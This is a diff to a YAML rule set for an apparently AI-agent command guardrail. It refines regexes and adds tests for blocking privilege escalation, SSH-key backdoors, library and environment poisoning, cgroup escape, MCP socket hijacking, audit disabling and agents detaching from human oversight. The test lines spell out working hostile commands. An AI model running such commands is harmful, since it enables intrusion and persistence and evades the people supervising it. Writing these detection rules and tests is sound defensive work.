@@ -164,7 +164,12 @@ rules:
 - id: ts-block-unbounded-agent-loop
   taxonomy: destructive-ops/resource-exhaustion/unbounded-agent-consumption
   match:
-    command_regex: while\s+(true|1|:)\s*;?\s*do\s+.*(\bclaude\b|\bopenai\b|\bgemini\b|\bcopilot\b|\bcodex\b|\bchatgpt\b)
+    # Keyword must be preceded by a command-boundary char (whitespace/;/&/|/`/() —
+    # not just a \b word boundary, which also matches inside "claude-501" (a
+    # hyphen is a non-word char too). Without this, any command whose text
+    # happens to contain this environment's own tmp-dir naming
+    # (/private/tmp/claude-<uid>/...) false-positives. See #3514.
+    command_regex: while\s+(true|1|:)\s*;?\s*do\b.*[\s;&|(](claude|openai|gemini|copilot|codex|chatgpt)\b
   decision: BLOCK
   confidence: 0.93
   reason: Infinite loop invoking AI agent CLI — spawns unbounded agent sessions consuming API quota without termination condition.
@@ -175,10 +180,14 @@ rules:
     tn:
     - while true; do echo hi; sleep 1; done
     - claude --prompt 'one shot task'
+    - while true; do if grep -q ok "/private/tmp/claude-501/tasks/x.output"; then break; fi; sleep 15; done
+    - while true; do curl -s http://localhost/openai-cache/status.json; sleep 5; done
 - id: ts-audit-mass-agent-spawn
   taxonomy: destructive-ops/resource-exhaustion/unbounded-agent-consumption
   match:
-    command_regex: for\s+\w+\s+in\s+\$\(seq\s+\d+\s+(\d{4,})\)\s*;?\s*do\s+.*(\bclaude\b|\bopenai\b|\bgemini\b|\bcopilot\b|\bcurl\s+https?://api\.)
+    # Same left-boundary fix as ts-block-unbounded-agent-loop above (#3514) —
+    # this rule shared the identical vulnerable ".*\bkeyword\b" shape.
+    command_regex: for\s+\w+\s+in\s+\$\(seq\s+\d+\s+(\d{4,})\)\s*;?\s*do\b.*[\s;&|(](claude\b|openai\b|gemini\b|copilot\b|curl\s+https?://api\.)
   decision: AUDIT
   confidence: 0.85
   reason: High-count for-loop invoking AI agent or AI API — may spawn thousands of agent sessions or API calls, exhausting quota.
@@ -189,6 +198,7 @@ rules:
     tn:
     - for i in $(seq 1 10); do claude --prompt 'task'; done
     - for i in $(seq 1 100); do echo $i; done
+    - for i in $(seq 1 10000); do echo "/private/tmp/claude-501/tasks/x.output"; done
 - id: ts-audit-ai-bulk-input-pipe
   taxonomy: unauthorized-execution/ai-resource-abuse/ai-denial-of-wallet
   match:
@@ -386,6 +396,13 @@ rules:
     # documented the attack. Writing down a dangerous command is not running
     # it. Downgrade rather than exclude (#2982) — the finding still fires and
     # is still AUDITed, it just stops interrupting.
+    #
+    # #3406 sweep: deliberately NOT adding in_interpreter_heredoc alongside
+    # in_heredoc. This rule's own reason says it "evades pipe-to-shell
+    # detection" — it is the sole coverage for eval+cmdsub RCE. A python/node
+    # heredoc whose body calls os.system("eval \"$(curl ...)\"") genuinely
+    # executes the payload; no companion rule catches that shape. Downgrading
+    # would turn a real RCE into an AUDIT-only finding.
     command_intent_downgrade: [is_doc_text, in_heredoc]
   decision: BLOCK
   confidence: 0.95
@@ -740,10 +757,19 @@ rules:
     tn:
     - apt list --installed
     - ls -la
+# Was `^`-anchored, relying on the wrapper-stripped candidate stopping AT
+# pkexec/runuser (neither was a transparent ExecWrapper) so "pkexec bash"
+# landed at position 0 of that candidate. #3227 made both transparent —
+# StripExecWrapperPrefix now recurses straight through them, so
+# `taskset -c 0-3 pkexec bash` fully resolves to `bash` alone and the
+# anchor never sees "pkexec" again. Same shape as ts-audit-chroot-arbitrary's
+# fix: a word-boundary match against the RAW text doesn't depend on which
+# candidate the wrapper walk produces.
 - id: ts-block-sudo-alternatives-shell
   taxonomy: privilege-escalation/command-execution/sudo-invocation
   match:
-    command_regex: ^(pkexec|doas|runuser)\s+(/usr(/local)?/bin/|/bin/)?(bash|sh|zsh|fish|csh|dash|ksh)(\s|$)
+    command_regex: \b(pkexec|doas|runuser)\s+(/usr(/local)?/bin/|/bin/)?(bash|sh|zsh|fish|csh|dash|ksh)(\s|$)
+    command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   confidence: 0.97
   reason: pkexec/doas/runuser spawning an interactive shell directly grants a root shell — equivalent to sudo bash but bypasses the sudo audit rule.
@@ -752,9 +778,12 @@ rules:
     - pkexec bash
     - doas /bin/sh
     - runuser /usr/bin/zsh
+    - taskset -c 0-3 pkexec bash
+    - nice -n 10 pkexec /bin/sh
     tn:
     - pkexec apt update
     - doas ls -la
+    - 'git commit -m "docs: pkexec bash spawns a root shell, block it"'
 - id: ts-audit-sudo-alternatives
   taxonomy: privilege-escalation/command-execution/sudo-invocation
   match:
@@ -1033,7 +1062,7 @@ rules:
 - id: ts-block-ld-preload-export
   taxonomy: privilege-escalation/command-execution/env-injection
   match:
-    command_regex: export\s+LD_(PRELOAD|LIBRARY_PATH)=(/tmp|/dev/shm|/var/tmp|/proc|/run/user)
+    command_regex: (?:export|declare\s+-\w*x\w*|typeset\s+-\w*x\w*)\s+LD_(PRELOAD|LIBRARY_PATH)=(/tmp|/dev/shm|/var/tmp|/proc|/run/user)
   decision: BLOCK
   confidence: 0.93
   reason: Exporting LD_PRELOAD/LD_LIBRARY_PATH to a world-writable or volatile path persistently poisons the current shell session and all child processes, enabling stealthy library injection.
@@ -1133,7 +1162,7 @@ rules:
 - id: ts-block-path-hijack-export
   taxonomy: privilege-escalation/command-execution/env-injection
   match:
-    command_regex: export\s+PATH=(/tmp|/dev/shm|/var/tmp|/run/user|\./|\.\./).*:\$PATH
+    command_regex: (?:export|declare\s+-\w*x\w*|typeset\s+-\w*x\w*)\s+PATH=(/tmp|/dev/shm|/var/tmp|/run/user|\./|\.\./).*:\$PATH
   decision: BLOCK
   confidence: 0.93
   reason: Exporting PATH with a world-writable or relative directory prepended hijacks command resolution for all subsequent commands in this shell session and child processes.
@@ -1268,10 +1297,21 @@ rules:
     tn:
     - grep SELINUX /etc/selinux/config
     - cat /etc/selinux/config
+  # Both AppArmor rules match a bare TOOL NAME, so they fired on prose that
+  # merely names the technique — including this repo's own rule-authoring
+  # traffic. Found by dogfooding on 2026-08-05: appending a policy pack via a
+  # heredoc whose COMMENTS mentioned aa-disable and apparmor_parser -R was
+  # blocked, with no aa-* tool anywhere in command position.
+  #
+  # This is the recurring technique-name-in-doc-text FP (see the memfd-create
+  # and namespace-escape rules, which already carry these labels). The excludes
+  # cost nothing in coverage: an actual invocation is in command position and
+  # carries none of these intents.
 - id: ts-block-apparmor-disable
   taxonomy: persistence-evasion/config-modification/security-module-disable
   match:
     command_regex: \baa-(disable|complain)\b
+    command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   reason: Deactivating an AppArmor profile removes LSM-based confinement. Defense evasion.
   confidence: 0.97
@@ -1282,10 +1322,12 @@ rules:
     tn:
     - aa-status
     - aa-enforce /etc/apparmor.d/usr.sbin.mysqld
+    - 'git commit -m "docs: aa-disable removes confinement"'
 - id: ts-block-apparmor-parser-remove
   taxonomy: persistence-evasion/config-modification/security-module-disable
   match:
     command_regex: \bapparmor_parser\b.*\s+-[a-zA-Z]*R[a-zA-Z]*\b
+    command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   reason: apparmor_parser -R unloads an AppArmor profile from the kernel, surgically removing confinement without disabling the entire service.
   confidence: 0.97
@@ -1434,11 +1476,21 @@ rules:
 # Before adding a tool here, check its man page for a flag that spawns a
 # process. `find -exec`, on the list already, is safe only because dedicated
 # BLOCK rules cover it — that is luck, not design.
+#
+# #3534: command_prefix matching on the ALLOW path is now token-boundary-aware
+# (shellparse.hasPrefixWithBoundary) — a bare entry like `ls` no longer matches
+# as a substring of an unrelated program (`lsyncd`, `pwdx`, `idmapd`, ...).
+# `lsmod`, `lsns` and `lsattr` used to reach ALLOW only by accident, as a
+# substring of `ls`; they are genuinely read-only and are now listed as their
+# own explicit entries so they keep ALLOW deliberately rather than by luck.
 - id: ts-allow-readonly
   match:
     command_regex_exclude: (?:^|[;&|]\s*)(?:man\b[^;|&]*(?:\s-P\b|\s--pager(?:[=\s]))|sort\b[^;|&]*\s--compress-program(?:[=\s]))
     command_prefix:
     - ls
+    - lsmod
+    - lsns
+    - lsattr
     - pwd
     - whoami
     - id
@@ -1483,11 +1535,21 @@ rules:
     - man ls
     - man -k pager
     - sort -u /tmp/list.txt
+    - lsmod
+    - lsns
+    - lsattr /etc/passwd
     tn:
     - rm -rf /tmp/build
     - sudo apt install nginx
     - man -P /bin/sh ls
     - sort --compress-program=/bin/sh /etc/hostname
+    - lsyncd /etc/lsyncd.conf
+    - lsyncd-with-a-payload.sh
+    - pwdx 1234
+    - idmapd -f
+    - dfu-util -D firmware.bin
+    - dumpe2fs /dev/disk1
+    - freeradius -X
 - id: ts-audit-llm-agent-import
   taxonomy: unauthorized-execution/ai-model-usage/uncontrolled-agent-execution
   match:
@@ -1568,12 +1630,12 @@ rules:
     tn:
     - autogpt --task 'write a report'
 - id: ts-block-agent-cli-background
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/agent-terminal-session-detachment
   match:
     command_regex: \b(nohup|disown)\b.*\b(crewai|autogpt|langgraph|agentops|taskweaver)\b
   decision: BLOCK
   confidence: 0.9
-  reason: Multi-agent framework CLI launched as background process via nohup/disown — severs the agent from interactive oversight, preventing human intervention. This is a deliberate human-oversight-circumvention pattern.
+  reason: Multi-agent framework CLI launched as background process via nohup/disown — severs the agent from interactive oversight, preventing human intervention. This is a deliberate terminal-detachment pattern.
   tests:
     tp:
     - nohup crewai run &
@@ -1581,12 +1643,12 @@ rules:
     tn:
     - nohup python3 server.py &
 - id: ts-block-agent-cli-detached-session
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/agent-terminal-session-detachment
   match:
     command_regex: (screen\s+.*-dm|tmux\s+new(-session)?\s+.*-d).*\b(crewai|autogpt|langgraph|agentops|taskweaver)\b
   decision: BLOCK
   confidence: 0.9
-  reason: Multi-agent framework CLI launched in a detached screen/tmux session — the agent runs autonomously without a terminal the human operator can observe or interrupt (human-oversight-circumvention).
+  reason: Multi-agent framework CLI launched in a detached screen/tmux session — the agent runs autonomously without a terminal the human operator can observe or interrupt (terminal-session-detachment).
   tests:
     tp:
     - screen -dmS agent crewai run
@@ -1918,12 +1980,33 @@ rules:
     # while `cat >> ~/.ssh/authorized_keys <<EOF` (real heredoc backdoor) still does.
     # setfacl/chmod permission attacks on this file are covered by the dedicated
     # ts-block-setfacl-world-grant / chmod rules; symlink attacks by the ln rules.
-    command_regex: (>{1,2}|\btee\b|\bcp\b|\bmv\b|\binstall\b|\bdd\b|\brsync\b|\bscp\b|-fprintf)\s*[^|&;<]*\.ssh/authorized_keys2?|\bsed\b\s+[^|&;<]*-i[^|&;<]*\.ssh/authorized_keys2?
+    # FP-fix (#3363): the `>`/`tee`/`-fprintf` branch's negated class
+    # `[^|&;<]*` permitted whitespace between the operator and the path, so the
+    # trigger was any bare `>` character followed *eventually* by the literal
+    # substring `.ssh/authorized_keys` — including the closing `>` of an
+    # unrelated `<placeholder>` notation in prose inside a heredoc body (e.g.
+    # `some-tool <path> writes to ~/.ssh/authorized_keys`), same class as
+    # #3362 (ts-block-ssh-config-write). A real redirect/-fprintf target is
+    # always a single whitespace-free token, so that group's class now
+    # excludes whitespace too (`[^\s|&;<]*`), with an explicit `(?:-\S+\s+)*`
+    # group to keep matching a flag between the operator and the path
+    # (`tee -a ~/.ssh/authorized_keys`).
+    #   The `cp`/`mv`/`install`/`dd`/`rsync`/`scp` branch deliberately KEEPS
+    # the loose `[^|&;<]*` class: those commands have the shape
+    # `verb SOURCE DEST` (e.g. `rsync -a keys/ host:~/.ssh/authorized_keys`),
+    # so the path is not contiguous with the verb — a genuine source argument
+    # sits between them. Tightening this branch the same way would turn real
+    # TPs into false negatives. It is a known, deliberately deferred residual:
+    # the same verb appearing as a bare word in heredoc/doc prose ahead of an
+    # eventual `.ssh/authorized_keys` mention can still match (#3363 review).
+    command_regex: (>{1,2}|\btee\b|-fprintf)\s*(?:-\S+\s+)*[^\s|&;<]*\.ssh/authorized_keys2?|(\bcp\b|\bmv\b|\binstall\b|\bdd\b|\brsync\b|\bscp\b)\s*[^|&;<]*\.ssh/authorized_keys2?|\bsed\b\s+[^|&;<]*-i[^|&;<]*\.ssh/authorized_keys2?
     # The exclude below is still REQUIRED: a language-interpreter heredoc body
     # can itself contain a redirect-shaped string literal (e.g. python3 <<EOF /
     # cmd = 'cat key >> ~/.ssh/authorized_keys' / EOF), which the target-anchored
-    # regex would otherwise match on the inner `>>`. The interpreter-heredoc and
-    # gh/git text-payload excludes suppress those source-code/prose mentions.
+    # regex would otherwise match on the inner `>>`. The gh/git text-payload
+    # exclude below suppresses prose mentions in commit/issue text; the
+    # command_intent_exclude in_interpreter_heredoc label (below) suppresses
+    # source-code mentions inside any language-interpreter heredoc body.
     # FP-fix (#1545): two additional FP sources:
     #   1. Compound commands like `cd /dir && git commit -m "..."` — the old
     #      `^(gh|git)` anchor missed git when preceded by `cd /dir &&`.
@@ -1931,7 +2014,19 @@ rules:
     #      after subshell expansion the `-m` argument has no surrounding
     #      quotes, so the old `-[mF]\s+["']` pattern (requiring a quote char)
     #      failed to suppress the match. Changed to `-[mF]\s` (space only).
-    command_regex_exclude: ^(echo|printf)\s+["'][^"']*["']\s*$|(?:^|&&\s*|;\s*)(?:gh|git)\s.*(?:--(?:body|body-file|message|notes|description|title|annotation|comment)\b|-[mF]\s)|>>?\s*["']?/tmp/|\bagentshield\s+mcp-eval\b|(?:^|&&\s*|;\s*)(python[23]?|perl|ruby|node|bun|tsx?|php|lua)\s+<<
+    # FP-fix (#3540): the hand-rolled interpreter-heredoc alternative this
+    # exclude used to carry — `(python[23]?|...)\s+<<` — required the
+    # interpreter name to be followed by ONLY whitespace before `<<`, so it
+    # missed `python3 - <<'PY'` (explicit stdin-as-program marker) and
+    # `python3 script.py <<'PY'` (script argument before the heredoc), both
+    # of which still feed the same source text this rule's own `reason:`
+    # promises is exempt. Replaced with the canonical in_interpreter_heredoc
+    # intent label (intent.go), which already recognizes any text between the
+    # interpreter name and `<<` on the same statement — the same label
+    # ts-block-python-inline-os-exec (this file) already uses for the
+    # identical class of source-code-body mention.
+    command_regex_exclude: ^(echo|printf)\s+["'][^"']*["']\s*$|(?:^|&&\s*|;\s*)(?:gh|git)\s.*(?:--(?:body|body-file|message|notes|description|title|annotation|comment)\b|-[mF]\s)|>>?\s*["']?/tmp/|\bagentshield\s+mcp-eval\b
+    command_intent_exclude: [is_bash_comment, in_interpreter_heredoc]
   decision: BLOCK
   confidence: 0.97
   reason: Writing to authorized_keys injects an SSH public key for persistent backdoor access. AI agents must never modify the authorized keys list. Matches only when authorized_keys is the *target* of a write verb (redirect >, tee, cp, mv, install, dd, rsync, scp, find -fprintf, sed -i). Files that merely mention the path in their content — docs, rules YAML, code, gh/git payloads, language-interpreter heredoc bodies — are not writes to the file and are allowed.
@@ -1942,10 +2037,20 @@ rules:
     # Real heredoc backdoor: writes the key INTO authorized_keys — still BLOCK.
     - "cat >> ~/.ssh/authorized_keys <<'EOF'\nssh-rsa AAAAB3NzaC1 attacker@evil\nEOF"
     - find . -maxdepth 0 -fprintf /root/.ssh/authorized_keys "ssh-ed25519 AAAA attacker"
+    # Real TP for the loose cp/mv/rsync branch: source arg genuinely sits
+    # between the verb and the path — the tightening below must not break this.
+    - rsync -a keys/ host:~/.ssh/authorized_keys
     tn:
     - ls ~/.ssh/known_hosts
     - agentshield mcp-eval --tool create_file --arg path=/home/user/.ssh/authorized_keys
     - cd /workspace && agentshield mcp-eval --tool write_file --arg path=/home/user/.ssh/authorized_keys 2>&1; echo $?
+    # FP-fix #3363: heredoc body prose with an angle-bracket placeholder — the
+    # closing `>` of `<path>` is not a redirect (same shape as #3355/#3362).
+    - "cat > /tmp/issue.md <<'EOF'\nexample: some-tool <path> writes to ~/.ssh/authorized_keys\nEOF"
+    # FP-fix #3363: contiguous redirect-shaped text inside a bash comment —
+    # the tightened regex alone still matches this (target is genuinely
+    # contiguous with `>`), so this needs the command_intent_exclude.
+    - '# example: cat > ~/.ssh/authorized_keys'
     # FP-fix #2494: shell heredoc writing to a NON-protected file whose body/prose
     # mentions authorized_keys (e.g. authoring a Comply rule documenting the threat).
     # Redirect target is rules/*.yaml, not the SSH key file → must be ALLOWed.
@@ -1956,6 +2061,14 @@ rules:
     - "perl <<'EOF'\nmy $path = '/root/.ssh/authorized_keys';\nEOF"
     - "ruby <<RB\npaths = ['~/.ssh/authorized_keys']\nRB"
     - "cd /tmp && python3 <<'EOF'\nx = '~/.ssh/authorized_keys'\nEOF"
+    # FP-fix #3540: `python3 -` (explicit stdin-as-program marker) puts a `-`
+    # between the interpreter and `<<`, which the old hand-rolled
+    # `\s+<<`-only exclude missed even though the body is still Python source.
+    - "python3 - <<'PY'\ns = \"curl -s https://api.internal.corp/v1/keys > ~/.ssh/authorized_keys.new\"\nprint(s)\nPY"
+    # FP-fix #3540: a script-file argument before the heredoc — same miss.
+    - "python3 script.py <<'PY'\ns = \"curl -s https://x/keys > ~/.ssh/authorized_keys.new\"\nPY"
+    # FP-fix #3540: exact filename (no .new suffix) via the same `python3 -` shape.
+    - "python3 - <<'PY'\ns = \"curl -s https://x/keys > ~/.ssh/authorized_keys\"\nPY"
     # FP-fix #1545: git/gh in compound commands and shell-expanded (unquoted) form
     - "cd /workspace && git commit -m \"protect ~/.ssh/authorized_keys in docs\""
     - "git commit -m feat: document ~/.ssh/authorized_keys protection"
@@ -3266,7 +3379,7 @@ rules:
     tn:
     - ls /proc/self/fd
 - id: ts-block-cicd-write
-  taxonomy: persistence-evasion/cicd-tampering/pipeline-config-write
+  taxonomy: supply-chain/build-pipeline/cicd-config-injection
   match:
     # >>? (not just >>) so a truncating overwrite (echo x > file) is caught
     # exactly like an append (echo x >> file) — a truncate is strictly MORE
@@ -3304,7 +3417,7 @@ rules:
     - 'gh issue create --repo AI-AgentLens/agentshield-oss --title "FP report" --body "FP: echo step >> .github/workflows/ci.yml triggers block inside body text"'
     - 'git commit -m "fix: echo step >> .github/workflows/ci.yml pattern in commit message"'
 - id: ts-block-cicd-write-reverse
-  taxonomy: persistence-evasion/cicd-tampering/pipeline-config-write
+  taxonomy: supply-chain/build-pipeline/cicd-config-injection
   match:
     # Same >>?/[^|;\n]* fixes as ts-block-cicd-write above — this rule is the
     # bare-path fallback (no .github/ prefix required) and shares the same bug.
@@ -3333,7 +3446,7 @@ rules:
     - 'gh pr create --title "Fix CI" --body "Pipeline: echo step >> workflows/deploy.yml was added by agent"'
     - 'git commit -m "docs: explain echo step >> workflows/ci.yml pattern"'
 - id: ts-block-cicd-cp-mv
-  taxonomy: persistence-evasion/cicd-tampering/pipeline-config-write
+  taxonomy: supply-chain/build-pipeline/cicd-config-injection
   match:
     command_regex: (cp|mv)(\s+-\S+)*\s+\S+\s+(\./)?(.*\.github/workflows/|Jenkinsfile|\.gitlab-ci\.yml|\.circleci/config\.yml|\.travis\.yml)
   decision: BLOCK
@@ -4303,7 +4416,7 @@ rules:
 - id: ts-block-interpreter-path-poison-export
   taxonomy: privilege-escalation/command-execution/env-injection
   match:
-    command_regex: export\s+(PYTHONPATH|NODE_PATH|RUBYLIB|PERL5LIB|PERLLIB|GEM_HOME|GEM_PATH|npm_config_prefix)=(/tmp|/dev/shm|/var/tmp|/run/user|\./|\.\./)\S*
+    command_regex: (?:export|declare\s+-\w*x\w*|typeset\s+-\w*x\w*)\s+(PYTHONPATH|NODE_PATH|RUBYLIB|PERL5LIB|PERLLIB|GEM_HOME|GEM_PATH|npm_config_prefix)=(/tmp|/dev/shm|/var/tmp|/run/user|\./|\.\./)\S*
   decision: BLOCK
   confidence: 0.93
   reason: Exporting an interpreter search path pointing to a world-writable or relative directory poisons the entire shell session — all subsequent interpreter invocations will silently load attacker-controlled modules.
@@ -4408,7 +4521,7 @@ rules:
 - id: ts-block-dyld-inject-export
   taxonomy: privilege-escalation/command-execution/env-injection
   match:
-    command_regex: export\s+DYLD_(INSERT_LIBRARIES|LIBRARY_PATH|FRAMEWORK_PATH|FALLBACK_LIBRARY_PATH)=(/tmp|/dev/shm|/var/tmp|/private/tmp|\./|\.\./)\S*
+    command_regex: (?:export|declare\s+-\w*x\w*|typeset\s+-\w*x\w*)\s+DYLD_(INSERT_LIBRARIES|LIBRARY_PATH|FRAMEWORK_PATH|FALLBACK_LIBRARY_PATH)=(/tmp|/dev/shm|/var/tmp|/private/tmp|\./|\.\./)\S*
   decision: BLOCK
   confidence: 0.93
   reason: Exporting macOS DYLD_ variable pointing to a writable directory persistently poisons the shell session — all child processes will load the attacker's library.
@@ -4764,13 +4877,35 @@ rules:
     # crossing a `=` (assignment) or `(` (call). Stops a Go/JS identifier like
     # `eval := X{a, b}` written into a heredoc from pairing with a distant struct
     # literal (issue #2355) while still matching `eval {r,m}` fragment assembly.
-    command_regex: (?:^|[;|&(\s])(eval|exec)\s+[^=(]*\{[^}]*,[^}]*\}
+    #
+    # #3473: [^=();|&\n]* additionally stops at a pipe/`&&`/`;`/newline, so
+    # "eval"/"exec" can only pair with a brace in the SAME statement — not a
+    # brace on the far side of a pipe (`docker exec c df -h | awk '{...}'`) or
+    # a later `&&`-chained command (`docker exec c ls && cp file{1,2}.txt .`).
+    # And the brace content itself must look like a real comma-separated
+    # alternation ([-\w./]* branches, one-or-more commas) rather than any
+    # brace containing a comma anywhere inside — `awk '{print "a, b"}'` and
+    # `jq '{name: .n, id: .i}'` both have commas inside `{}` but neither is
+    # brace expansion: the content is a quoted/prose action block, not bare
+    # word-ish/path fragments. `/` stays in the class — `exec {/,bi,n/,sh}`
+    # assembles `/bin/sh` from path fragments and must keep matching.
+    # "docker exec"/"kubectl exec" (a subcommand, not the shell builtin)
+    # still satisfies the eval/exec anchor since RE2 has no lookbehind to
+    # rule out a preceding "docker" — the same-statement + bareword-content
+    # narrowing is what closes the FP without one.
+    command_regex: (?:^|[;|&(\s])(eval|exec)\s+[^=();|&\n]*\{(?:[-\w./]*,)+[-\w./]*\}
     # #3060: the [^=(]* narrowing above was added for the Go/JS identifier FP in
     # #2355, and narrowing a pattern cannot fix a context problem — documentation
     # that DESCRIBES fragment assembly matches it as exactly as the assembly
     # does, and describing the technique is how it gets defended against. The
     # intent label is the mechanism built for this: text being written to a file
     # is not a command being run.
+    #
+    # #3406 sweep: deliberately NOT adding in_interpreter_heredoc alongside
+    # in_heredoc. This is fragment-assembly RCE evasion (eval {r,m} -> rm) with
+    # no companion detection — a python/node heredoc calling
+    # os.system("eval {r,m} ...") genuinely assembles and runs the command.
+    # Downgrading would turn a real RCE into an AUDIT-only finding.
     command_intent_downgrade: [is_doc_text, in_heredoc]
   decision: BLOCK
   confidence: 0.92
@@ -4783,6 +4918,8 @@ rules:
     tn:
     - echo {1..10}
     - agentshield mcp-eval --json '{"action":"type","text":"hello"}'
+    - "docker exec postgres-source df -h /var/lib/postgresql/data | tail -1 | awk '{print \"  volume: \"$2\" total, \"$3\" used\"}'"
+    - docker exec mycontainer ls && cp file{1,2}.txt /tmp/backup/
 - id: ts-block-cmdsub-brace-eval
   taxonomy: unauthorized-execution/remote-code-exec/indirect-code-exec
   match:
@@ -4841,7 +4978,7 @@ rules:
 - id: ts-block-shell-env-startup-export
   taxonomy: persistence-evasion/shell-init/shell-env-poisoning
   match:
-    command_regex: export\s+(BASH_ENV|ENV)=
+    command_regex: (?:export|declare\s+-\w*x\w*|typeset\s+-\w*x\w*)\s+(BASH_ENV|ENV)=
   decision: BLOCK
   confidence: 0.95
   reason: Exporting BASH_ENV or ENV causes bash/sh to source the specified file before every non-interactive shell invocation — silently injecting code into all subshells, scripts, and command substitutions.
@@ -4872,7 +5009,7 @@ rules:
 - id: ts-block-prompt-command-export
   taxonomy: persistence-evasion/shell-init/shell-env-poisoning
   match:
-    command_regex: export\s+PROMPT_COMMAND=
+    command_regex: (?:export|declare\s+-\w*x\w*|typeset\s+-\w*x\w*)\s+PROMPT_COMMAND=
   decision: BLOCK
   confidence: 0.95
   reason: Exporting PROMPT_COMMAND causes bash to execute the value as a command before every prompt display — ideal for persistent beaconing, credential harvesting, or keylogging. Fires on every Enter keystroke.
@@ -4898,7 +5035,7 @@ rules:
 - id: ts-block-runtime-code-inject-export
   taxonomy: privilege-escalation/command-execution/env-injection
   match:
-    command_regex: export\s+(PYTHONSTARTUP|PERL5OPT|RUBYOPT|NODE_OPTIONS|JAVA_TOOL_OPTIONS)=
+    command_regex: (?:export|declare\s+-\w*x\w*|typeset\s+-\w*x\w*)\s+(PYTHONSTARTUP|PERL5OPT|RUBYOPT|NODE_OPTIONS|JAVA_TOOL_OPTIONS)=
   decision: BLOCK
   confidence: 0.95
   reason: Exporting a runtime code injection env var (PYTHONSTARTUP, PERL5OPT, RUBYOPT, NODE_OPTIONS, JAVA_TOOL_OPTIONS) silently injects code into every subsequent invocation of that language runtime. Unlike search path vars, these execute code directly.
@@ -5870,7 +6007,8 @@ rules:
     - cat /sys/fs/cgroup/release_agent
     tn:
     - echo hello > /tmp/output.txt
-    - cat > /tmp/notes.md <<'EOF'
+    - |-
+      cat > /tmp/notes.md <<'EOF'
       This taxonomy entry documents the cgroup release_agent container escape (CVE-2022-0492).
       EOF
 - id: ts-block-cgroup-notify-on-release
@@ -5889,7 +6027,8 @@ rules:
     - cat /sys/fs/cgroup/notify_on_release
     tn:
     - echo hello > /tmp/output.txt
-    - cat > /tmp/notes.md <<'EOF'
+    - |-
+      cat > /tmp/notes.md <<'EOF'
       Setting notify_on_release to 1 is the prerequisite step in the escape chain.
       EOF
 - id: ts-block-cgroup-mount
@@ -5906,7 +6045,8 @@ rules:
     - mount -t cgroup2 none /sys/fs/cgroup
     tn:
     - mount /dev/sda1 /mnt
-    - cat > /tmp/notes.md <<'EOF'
+    - |-
+      cat > /tmp/notes.md <<'EOF'
       The escape starts with mount -t cgroup to get access to control files.
       EOF
 - id: ts-audit-cgroup-procs-write
@@ -5925,7 +6065,8 @@ rules:
     - cat /sys/fs/cgroup/cgroup.procs
     tn:
     - echo hello > /tmp/output.txt
-    - cat > /tmp/notes.md <<'EOF'
+    - |-
+      cat > /tmp/notes.md <<'EOF'
       Writing a PID to cgroup.procs is how the release_agent trigger fires.
       EOF
 - id: ts-block-inotify-credential-watch
@@ -6300,15 +6441,20 @@ rules:
   taxonomy: unauthorized-execution/agentic-attacks/mcp-authorization-bypass
   match:
     command_regex: (socat|nc|ncat|netcat)\s+.*(/tmp/mcp[-_.]|~/.mcp/.*\.sock|/var/run/mcp)
+    command_position_exclude: [heredoc_body]
   decision: BLOCK
   confidence: 0.93
-  reason: Binding or proxying a MCP Unix socket — a man-in-the-middle listener on the MCP socket can harvest OAuth tokens, intercept tool calls, and tamper with redirect URIs.
+  reason: Binding or proxying a MCP Unix socket — a man-in-the-middle listener on the MCP socket can harvest OAuth tokens, intercept tool calls, and tamper with redirect URIs. Does not fire when the only occurrence is prose inside a `git commit -F -` heredoc body (e.g. a commit message documenting this rule) — the real listener command still fires everywhere else (#3493).
   tests:
     tp:
     - socat UNIX-LISTEN:/tmp/mcp-cursor.sock,fork UNIX:/real.sock
     - nc -lU /tmp/mcp-agent.sock
     tn:
     - socat TCP-LISTEN:8080,fork TCP:localhost:3000
+    - |
+      git commit -q -F - <<'EOF'
+      ts-block-mcp-socket-hijack — socat/nc binding or proxying /tmp/mcp-cursor.sock, ~/.mcp/x.sock, or /var/run/mcp/y.
+      EOF
 - id: ts-block-agent-session-hijack
   taxonomy: unauthorized-execution/agentic-attacks/agent-session-hijacking
   match:
@@ -6592,7 +6738,7 @@ rules:
     tn:
     - openssl enc -d -aes-256-cbc -in file.enc -out file.txt
 - id: ts-block-auditd-disable
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/local-security-monitor-suppression
   match:
     command_regex: \b(systemctl\s+(stop|disable|mask)|service\s+audit\w*\s+stop|pkill\s+-[fF]\s+audit|killall\s+audit)\b.*\baudit
     command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
@@ -6611,7 +6757,7 @@ rules:
     - 'git commit -m "add rule to detect systemctl stop auditd"'
     - 'gh issue create --body "systemctl disable auditd blinds SIEM monitoring"'
 - id: ts-block-auditctl-disable
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/local-security-monitor-suppression
   match:
     command_regex: \bauditctl\s+.*(-e\s*0|--disable|--enabled\s+0|-D\b|--delete-rules|--flush\b)
   decision: BLOCK
@@ -6684,7 +6830,7 @@ rules:
     tn:
     - cat /proc/sysrq-trigger
 - id: ts-audit-nohup-agent-oversight
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/agent-terminal-session-detachment
   match:
     command_regex: nohup\s+.*\b(agentshield|claude|cursor|windsurf|copilot|codeium|hook|approval|oversight)\b.*&\s*$
   decision: AUDIT
@@ -6692,7 +6838,7 @@ rules:
   reason: nohup backgrounding an agent hook or oversight process — detaches the process from the terminal, making it invisible to the session and potentially bypassing approval workflows.
   tests:
     tp:
-    - nohup agentshield run -- ls &
+    - nohup agentshield mcp-proxy &
     - nohup claude --print 'hello' &
     tn:
     - nohup ./build.sh &
@@ -6981,12 +7127,34 @@ rules:
     - head ../../../../etc/shadow
     tn:
     - cat ../../src/main.go
+# Converted from a structural rule to a regex one by #3227, and the reason
+# generalises to any rule that keys on a wrapper by NAME.
+#
+# This matched `structural.executable: [chroot]`. Making chroot transparent
